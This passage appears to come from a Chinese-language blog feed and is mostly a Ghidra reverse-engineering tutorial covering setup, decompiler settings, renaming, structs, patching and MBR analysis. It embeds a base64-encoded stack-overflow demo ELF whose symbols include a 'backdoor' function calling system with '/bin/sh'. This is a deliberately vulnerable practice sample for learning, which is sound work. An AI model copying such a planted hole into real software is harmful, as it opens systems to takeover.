<li>如果需要将环境变量中的 JAVA 指向 1.8 版本，则删除系统环境变量的 Path 中的 <code>C:\Program Files\Java\jdk1.8.0_202\bin;</code> 和 <code>C:\Program Files (x86)\Common Files\Oracle\Java\javapath;</code>，通过手动配置的 <code>JAVA_HOME</code> 环境变量指定 JDK 版本</li>
</ul>
</li>
<li>以默认安装路径安装的JDK11，Ghidra 通常可以自动搜索到，随后能够正常启动程序；如果搜索不到请自行根据提示填入JDK11路径</li>
</ul>
</li>
<li>【Windows环境下 - 采用 zip 压缩包解压】：解压 jdk 后手动指定 <code>JAVA_HOME</code> 环境变量为解压的目录，并将 <code>%JAVA_HOME%\bin</code> 加入 <code>Path</code> 系统环境变量</li>
</ul>
</li>
</ul>
<p>🛠 <strong>安装</strong>：</p>
<ul>
<li>解压后执行启动脚本即可运行，官方也有<a href="https://ghidra-sre.org/InstallationGuide.html">安装向导</a><ul>
<li>Windows 执行 <code>ghidraRun.bat</code> 脚本启动程序</li>
<li>Linux &#x2F; MacOS 执行 <code>ghidraRun</code> 启动程序</li>
</ul>
</li>
<li>可以手动制作一个快捷方式便于启动（将启动脚本作为目标程序，解压后的support文件夹中也有ico图标）</li>
</ul>
<h2 id="示例程序下载"><a href="#示例程序下载" class="headerlink" title="示例程序下载"></a>示例程序下载</h2><p>一个简单的栈溢出小程序(Base64 Encoded)：</p>
<p>demo.out: </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">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DAA0AAAAAAAAAAAAAAAAAAAAAAAAMABwCYBEAAAAAAAAAAAAAAAAAAAAAAAAMACAAKBUAAAAAAAAAAAAAAAAAAAAAAAAMACQAgBUAAAAAAAAAAAAAAAAAAAAAAAAMACgBQBUAAAAAAAAAAAAAAAAAAAAAAAAMACwCABUAAAAAAAAAAAAAAAAAAAAAAAAMADAAAEEAAAAAAAAAAAAAAAAAAAAAAAAMADQAgEEAAAAAAAAAAAAAAAAAAAAAAAAMADgCQEEAAAAAAAAAAAAAAAAAAAAAAAAMADwDwEEAAAAAAAAAAAAAAAAAAAAAAAAMAEAAoE0AAAAAAAAAAAAAAAAAAAAAAAAMAEQAAIEAAAAAAAAAAAAAAAAAAAAAAAAMAEgBoIEAAAAAAAAAAAAAAAAAAAAAAAAMAEwDAIEAAAAAAAAAAAAAAAAAAAAAAAAMAFAAQPkAAAAAAAAAAAAAAAAAAAAAAAAMAFQAYPkAAAAAAAAAAAAAAAAAAAAAAAAMAFgAgPkAAAAAAAAAAAAAAAAAAAAAAAAMAFwDwP0AAAAAAAAAAAAAAAAAAAAAAAAMAGAAAQEAAAAAAAAAAAAAAAAAAAAAAAAMAGQBIQEAAAAAAAAAAAAAAAAAAAAAAAAMAGgBgQEAAAAAAAAAAAAAAAAAAAAAAAAMAGwAAAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAADAAAAAIADwAwEUAAAAAAAAAAAAAAAAAADgAAAAIADwBgEUAAAAAAAAAAAAAAAAAAIQAAAAIADwCgEUAAAAAAAAAAAAAAAAAANwAAAAEAGgBgQEAAAAAAAAEAAAAAAAAARgAAAAEAFQAYPkAAAAAAAAAAAAAAAAAAbQAAAAIADwDQEUAAAAAAAAAAAAAAAAAAeQAAAAEAFAAQPkAAAAAAAAAAAAAAAAAAmAAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAAQAAAAQA8f8AAAAAAAAAAAAAAAAAAAAAnwAAAAEAEwD8IUAAAAAAAAAAAAAAAAAAAAAAAAQA8f8AAAAAAAAAAAAAAAAAAAAArQAAAAAAFAAYPkAAAAAAAAAAAAAAAAAAvgAAAAEAFgAgPkAAAAAAAAAAAAAAAAAAxwAAAAAAFAAQPkAAAAAAAAAAAAAAAAAA2gAAAAAAEgBoIEAAAAAAAAAAAAAAAAAA7QAAAAEAGAAAQEAAAAAAAAAAAAAAAAAAAwEAABIADwAgE0AAAAAAAAUAAAAAAAAAEwEAABIADwDWEUAAAAAAAIQAAAAAAAAAHAEAABIAAAAAAAAAAAAAAAAAAAAAAAAAsgEAACAAGQBIQEAAAAAAAAAAAAAAAAAAMQEAABIAAAAAAAAAAAAAAAAAAAAAAAAAQwEAABAAGQBgQEAAAAAAAAAAAAAAAAAADQEAABICEAAoE0AAAAAAAAAAAAAAAAAASgEAABIAAAAAAAAAAAAAAAAAAAAAAAAAXgEAABEAGgCAQEAAAAAAAMgAAAAAAAAAZAEAABIAAAAAAAAAAAAAAAAAAAAAAAAAeAEAABEAGQBYQEAAAAAAAAgAAAAAAAAAfwEAABIAAAAAAAAAAAAAAAAAAAAAAAAAkQEAABIAAAAAAAAAAAAAAAAAAAAAAAAAsAEAABAAGQBIQEAAAAAAAAAAAAAAAAAAvQEAACAAAAAAAAAAAAAAAAAAAAAAAAAAzAEAABECGQBQQEAAAAAAAAAAAAAAAAAA2QEAABEAEQAAIEAAAAAAAAQAAAAAAAAA6AEAABIADwCwEkAAAAAAAGUAAAAAAAAA+AEAABIADwBaEkAAAAAAABUAAAAAAAAAuQAAABAAGgBIQUAAAAAAAAAAAAAAAAAAAQIAABICDwAgEUAAAAAAAAUAAAAAAAAAtgEAABIADwDwEEAAAAAAAC8AAAAAAAAAGQIAABAAGgBgQEAAAAAAAAAAAAAAAAAAJQIAABIADwBvEkAAAAAAADIAAAAAAAAAKgIAABIAAAAAAAAAAAAAAAAAAAAAAAAARAIAABECGQBgQEAAAAAAAAAAAAAAAAAA8gEAABICDAAAEEAAAAAAAAAAAAAAAAAAAGNydHN0dWZmLmMAZGVyZWdpc3Rlcl90bV9jbG9uZXMAX19kb19nbG9iYWxfZHRvcnNfYXV4AGNvbXBsZXRlZC44MDYxAF9fZG9fZ2xvYmFsX2R0b3JzX2F1eF9maW5pX2FycmF5X2VudHJ5AGZyYW1lX2R1bW15AF9fZnJhbWVfZHVtbXlfaW5pdF9hcnJheV9lbnRyeQBkZW1vLmMAX19GUkFNRV9FTkRfXwBfX2luaXRfYXJyYXlfZW5kAF9EWU5BTUlDAF9faW5pdF9hcnJheV9zdGFydABfX0dOVV9FSF9GUkFNRV9IRFIAX0dMT0JBTF9PRkZTRVRfVEFCTEVfAF9fbGliY19jc3VfZmluaQBzYXlIZWxsbwBzdHJuY3B5QEBHTElCQ18yLjIuNQBwdXRzQEBHTElCQ18yLjIuNQBfZWRhdGEAc3lzdGVtQEBHTElCQ18yLjIuNQB1c2VycwBwcmludGZAQEdMSUJDXzIuMi41AGJhbm5lcgByZWFkQEBHTElCQ18yLjIuNQBfX2xpYmNfc3RhcnRfbWFpbkBAR0xJQkNfMi4yLjUAX19kYXRhX3N0YXJ0AF9fZ21vbl9zdGFydF9fAF9fZHNvX2hhbmRsZQBfSU9fc3RkaW5fdXNlZABfX2xpYmNfY3N1X2luaXQAYmFja2Rvb3IAX2RsX3JlbG9jYXRlX3N0YXRpY19waWUAX19ic3Nfc3RhcnQAbWFpbgBfX2lzb2M5OV9zY2FuZkBAR0xJQkNfMi43AF9fVE1DX0VORF9fAAAuc3ltdGFiAC5zdHJ0YWIALnNoc3RydGFiAC5pbnRlcnAALm5vdGUuZ251LnByb3BlcnR5AC5ub3RlLmdudS5idWlsZC1pZAAubm90ZS5BQkktdGFnAC5nbnUuaGFzaAAuZHluc3ltAC5keW5zdHIALmdudS52ZXJzaW9uAC5nbnUudmVyc2lvbl9yAC5yZWxhLmR5bgAucmVsYS5wbHQALmluaXQALnBsdC5zZWMALnRleHQALmZpbmkALnJvZGF0YQAuZWhfZnJhbWVfaGRyAC5laF9mcmFtZQAuaW5pdF9hcnJheQAuZmluaV9hcnJheQAuZHluYW1pYwAuZ290AC5nb3QucGx0AC5kYXRhAC5ic3MALmNvbW1lbnQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbAAAAAQAAAAIAAAAAAAAAGANAAAAAAAAYAwAAAAAAABwAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAIwAAAAcAAAACAAAAAAAAADgDQAAAAAAAOAMAAAAAAAAgAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAADYAAAAHAAAAAgAAAAAAAABYA0AAAAAAAFgDAAAAAAAAJAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABJAAAABwAAAAIAAAAAAAAAfANAAAAAAAB8AwAAAAAAACAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAVwAAAPb//28CAAAAAAAAAKADQAAAAAAAoAMAAAAAAAAcAAAAAAAAAAYAAAAAAAAACAAAAAAAAAAAAAAAAAAAAGEAAAALAAAAAgAAAAAAAADAA0AAAAAAAMADAAAAAAAA2AAAAAAAAAAHAAAAAQAAAAgAAAAAAAAAGAAAAAAAAABpAAAAAwAAAAIAAAAAAAAAmARAAAAAAACYBAAAAAAAAHEAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAcQAAAP///28CAAAAAAAAAAoFQAAAAAAACgUAAAAAAAASAAAAAAAAAAYAAAAAAAAAAgAAAAAAAAACAAAAAAAAAH4AAAD+//9vAgAAAAAAAAAgBUAAAAAAACAFAAAAAAAAMAAAAAAAAAAHAAAAAQAAAAgAAAAAAAAAAAAAAAAAAACNAAAABAAAAAIAAAAAAAAAUAVAAAAAAABQBQAAAAAAADAAAAAAAAAABgAAAAAAAAAIAAAAAAAAABgAAAAAAAAAlwAAAAQAAABCAAAAAAAAAIAFQAAAAAAAgAUAAAAAAACQAAAAAAAAAAYAAAAYAAAACAAAAAAAAAAYAAAAAAAAAKEAAAABAAAABgAAAAAAAAAAEEAAAAAAAAAQAAAAAAAAGwAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAACcAAAAAQAAAAYAAAAAAAAAIBBAAAAAAAAgEAAAAAAAAHAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAABAAAAAAAAAApwAAAAEAAAAGAAAAAAAAAJAQQAAAAAAAkBAAAAAAAABgAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAALAAAAABAAAABgAAAAAAAADwEEAAAAAAAPAQAAAAAAAANQIAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAC2AAAAAQAAAAYAAAAAAAAAKBNAAAAAAAAoEwAAAAAAAA0AAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAvAAAAAEAAAACAAAAAAAAAAAgQAAAAAAAACAAAAAAAABmAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAMQAAAABAAAAAgAAAAAAAABoIEAAAAAAAGggAAAAAAAAVAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAADSAAAAAQAAAAIAAAAAAAAAwCBAAAAAAADAIAAAAAAAAEABAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAA3AAAAA4AAAADAAAAAAAAABA+QAAAAAAAEC4AAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAOgAAAAPAAAAAwAAAAAAAAAYPkAAAAAAABguAAAAAAAACAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAAD0AAAABgAAAAMAAAAAAAAAID5AAAAAAAAgLgAAAAAAANABAAAAAAAABwAAAAAAAAAIAAAAAAAAABAAAAAAAAAA/QAAAAEAAAADAAAAAAAAAPA/QAAAAAAA8C8AAAAAAAAQAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAAIBAAABAAAAAwAAAAAAAAAAQEAAAAAAAAAwAAAAAAAASAAAAAAAAAAAAAAAAAAAAAgAAAAAAAAACAAAAAAAAAALAQAAAQAAAAMAAAAAAAAASEBAAAAAAABIMAAAAAAAABgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAAEQEAAAgAAAADAAAAAAAAAGBAQAAAAAAAYDAAAAAAAADoAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAAAAAAAAAAABYBAAABAAAAMAAAAAAAAAAAAAAAAAAAAGAwAAAAAAAAKwAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAgAAAAAAAAAAAAAAAAAAAAAAAACQMAAAAAAAAMAGAAAAAAAAHQAAAC0AAAAIAAAAAAAAABgAAAAAAAAACQAAAAMAAAAAAAAAAAAAAAAAAAAAAAAAUDcAAAAAAABQAgAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABEAAAADAAAAAAAAAAAAAAAAAAAAAAAAAKA5AAAAAAAAHwEAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAA=</span><br></pre></td></tr></table></figure>

<p>去除符号表版本：</p>
<p>demo_nosym.out:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="导入要分析的程序"><a href="#导入要分析的程序" class="headerlink" title="导入要分析的程序"></a><strong>导入要分析的程序</strong></h2><p>先通过 <code>File - New Project...</code> 根据提示创建一个项目，创建完成后可以直接将要分析的程序拖拽进来，选择好对应的程序格式(Ghidra会自动识别，识别不出来的时候再手动选择，比如在<a href="https://www.notion.so/Ghidra-b556a01cb9b640678c8b467895a15568?pvs=21">分析MBR程序时</a>), 直接双击要分析的程序即可进入代码浏览器。头一次打开会提示进行分析，提示一律默认即可。</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled.gif" alt="Untitled"></p>
<h2 id="设置修改"><a href="#设置修改" class="headerlink" title="设置修改"></a><strong>设置修改</strong></h2><p>可以先在 <code>Edit - Tool Options...</code> 中修改一下 <code>Decompiler</code> 的设置（默认的设置会不显示它认为不可达的代码段，导致在反编译一些程序时可能会找不着部分代码；另外有些函数方法前缀太长，通过设置可以简化一下显示）</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled.png" alt="Untitled"></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-2.png" alt="image-2.png"></p>
<h2 id="日常使用"><a href="#日常使用" class="headerlink" title="日常使用"></a><strong>日常使用</strong></h2><p>所有的功能窗口可以在 <code>Windows</code> 栏下选择打开</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-3.png" alt="image-3.png"></p>
<p>最常用的自然是 <code>Decompile</code> 窗口，不过也不能过分依赖 Ghidra 反编译产生的代码，反编译的代码可能是有问题的，需要再结合中间的汇编代码进行分析。</p>
<h3 id="查找字符串"><a href="#查找字符串" class="headerlink" title="查找字符串"></a><strong>查找字符串</strong></h3><p>在 <code>Defined Strings</code> 窗口可以直接查看搜索识别到的字符串数据：</p>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-4.png" alt="image-4.png" style="zoom:50%;" />

<h3 id="查看函数调用图"><a href="#查看函数调用图" class="headerlink" title="查看函数调用图"></a><strong>查看函数调用图</strong></h3><p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%201.png" alt="Untitled"></p>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-5.png" alt="image-5.png" style="zoom:50%;" />

<p>想知道如何才能进入某个函数，也可以通过函数调用树可以清晰的看出来：</p>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%202.png" alt="Untitled" style="zoom:50%;" />

<h3 id="修改变量名"><a href="#修改变量名" class="headerlink" title="修改变量名"></a><strong>修改变量名</strong></h3><p>在变量上右键可以修改变量名（或者使用快捷键 L ）：</p>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%203.png" alt="Untitled" style="zoom:50%;" />

<p>有些 <code>undefined</code> 类型的变量在反编译板块右键没有修改变量名称选项，需要在汇编板块进行修改：</p>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%204.png" alt="Untitled" style="zoom:50%;" />

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%205.png" alt="Untitled"></p>
<h3 id="添加注释"><a href="#添加注释" class="headerlink" title="添加注释"></a><strong>添加注释</strong></h3><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%206.png" alt="Untitled" style="zoom:50%;" />

<h3 id="数据显示"><a href="#数据显示" class="headerlink" title="数据显示"></a><strong>数据显示</strong></h3><p>想让这种在 data 段的数据在伪代码界面能够直接显示字符串内容，选择数据格式为 TerminatedCString 即可</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%207.png" alt="Untitled"></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%208.png" alt="Untitled"></p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%209.png" alt="Untitled"></p>
<p>如果内容是中文，这种情况：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%2010.png" alt="Untitled"></p>
<p>可以在这个默认设置里修改默认字符集为 UTF-8 或 GB2312，就能正常显示了：</p>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%2011.png" alt="Untitled" style="zoom:50%;" />

<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%2012.png" alt="Untitled" style="zoom:50%;" />

<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%2013.png" alt="Untitled"></p>
<p>然后对于后续其他同样的字符串可以使用快捷键 Y 转换。</p>
<h3 id="添加结构体"><a href="#添加结构体" class="headerlink" title="添加结构体"></a>添加结构体</h3><p>在 <code>Data Type Manager</code> 功能窗口中可以创建新的结构体：</p>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%2014.png" alt="Untitled" style="zoom:50%;" />

<p>自定义编辑结构体中包含的数据类型：</p>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%2015.png" alt="Untitled" style="zoom:50%;" />

<p>某全局变量配置结构体之前：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%2016.png" alt="Untitled"></p>
<p>指定自定义的结构体后：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%2017.png" alt="Untitled"></p>
<h3 id="Patching"><a href="#Patching" class="headerlink" title="Patching"></a>Patching</h3><p>在目标汇编代码处右键选择 Patch Instruction 可以进行指令修改：</p>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%2018.png" alt="Untitled" style="zoom:50%;" />

<p>结合 Clear Code Bytes 也可以任意修改成其他指令：</p>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%2019.png" alt="Untitled" style="zoom:50%;" />

<h2 id="分析MBR程序"><a href="#分析MBR程序" class="headerlink" title="分析MBR程序"></a><strong>分析MBR程序</strong></h2><blockquote>
<p>配置方法参考： <a href="https://jarijaas.github.io/posts/disobey-2020/">https://jarijaas.github.io/posts/disobey-2020/</a></p>
</blockquote>
<p>选择语言时，选择 <code>x86 - Real Mode - 16 - little - default</code></p>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%2020.png" alt="Untitled" style="zoom:50%;" />

<p>然后使用 Memory Map 移动代码块的起始地址为 <code>0x7c00</code> (MBR 程序的入口点)</p>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Untitled%2021.png" alt="Untitled" style="zoom:50%;" />

<p>然后继续分析程序就好</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a><strong>其他</strong></h2><p>仍在学习中。。。</p>
]]></content>
      <categories>
        <category>Tool</category>
      </categories>
      <tags>
        <tag>Tutorial</tag>
      </tags>
  </entry>
  <entry>
    <title>DELL Vostro 7580 黑苹果安装</title>
    <url>/2020/09/28/Hackintosh/</url>
    <content><![CDATA[<h1 id="DELL-Vostro-7580-黑苹果安装"><a href="#DELL-Vostro-7580-黑苹果安装" class="headerlink" title="DELL Vostro 7580 黑苹果安装"></a>DELL Vostro 7580 黑苹果安装</h1><blockquote>
<p>本机配置:</p>
<p>型号：DELL Vostro 7580</p>
<p>配置：i5-8300H + Intel UHD Graphics 630 + GTX 1050 + ALC256 + Intel(R) Wireless-AC 9462 + Killer E2400</p>
<p>注意事项：</p>
<ol>
